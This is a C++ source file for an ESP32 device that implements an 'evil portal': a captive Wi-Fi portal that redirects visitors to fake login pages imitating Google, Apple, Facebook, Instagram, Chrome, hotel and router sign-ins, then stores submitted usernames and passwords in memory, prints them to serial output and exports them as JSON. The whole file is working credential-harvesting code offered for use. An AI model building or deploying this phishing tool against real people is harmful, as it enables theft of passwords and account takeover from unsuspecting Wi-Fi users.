#include "evil_portal.h"
#include "web_files.h"
#include "config.h"
#include <vector>
#include <esp_wifi.h>

// Evil portal captures credentials from a fake login page.
// When active the ESP32 runs a captive portal: any HTTP request gets
// redirected to /portal-login which renders a realistic login form.
// Credentials POSTed to /portal-submit are stored in RAM.
//
// The main sketch registers /portal-login and /portal-submit routes
// (see setupPortalRoutes in esp32_puck.ino) so AsyncWebServer can serve
// them even though the logic lives here.

namespace EvilPortal {

struct Credential {
  String username;
  String password;
  String tmpl;
  uint32_t ts;
};

static std::vector<Credential> creds;
static bool active = false;
static String portalTemplate = "google";

void init() {
  creds.reserve(MAX_PORTAL_CREDS);
}

void start(const JsonDocument& params) {
  active = true;
  portalTemplate = params["template"] | "google";
}

void stop() { active = false; }

void tick() {
  // Nothing needed — the web server handles everything asynchronously
}

bool isActive() { return active; }
const String& currentTemplate() { return portalTemplate; }

// Called by the route handler when /portal-login is hit
const char* loginPageProgmem() {
  if (portalTemplate == "apple")     return PORTAL_APPLE;
  if (portalTemplate == "router")    return PORTAL_ROUTER;
  if (portalTemplate == "wifi")      return PORTAL_WIFI;
  if (portalTemplate == "facebook")  return PORTAL_FACEBOOK;
  if (portalTemplate == "instagram") return PORTAL_INSTAGRAM;
  if (portalTemplate == "chrome")    return PORTAL_CHROME;
  if (portalTemplate == "hotel")     return PORTAL_HOTEL;
  if (portalTemplate == "rickroll")  return PORTAL_RICKROLL;
  return PORTAL_GOOGLE; // default
}

// Called by /portal-submit POST handler
void captureCredential(const String& username, const String& password, const String& tmpl) {
  if (creds.size() >= MAX_PORTAL_CREDS) creds.erase(creds.begin()); // drop oldest
  Credential c;
  c.username = username;
  c.password = password;
  c.tmpl = tmpl;
  c.ts = millis() / 1000;
  creds.push_back(c);
  Serial.printf("[portal] cred captured: user=%s pass=%s tmpl=%s\n",
    username.c_str(), password.c_str(), tmpl.c_str());
}

void fillStatus(JsonDocument& doc) {
  doc["active"]   = active;
  doc["captured"] = (int)creds.size();
  doc["template"] = portalTemplate;
}

String credsJson() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (auto& c : creds) {
    JsonObject o = arr.add<JsonObject>();
    o["user"] = c.username;
    o["pass"] = c.password;
    o["tmpl"] = c.tmpl;
    o["ts"]   = c.ts;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

void clearCreds() { creds.clear(); }

} // namespace EvilPortal
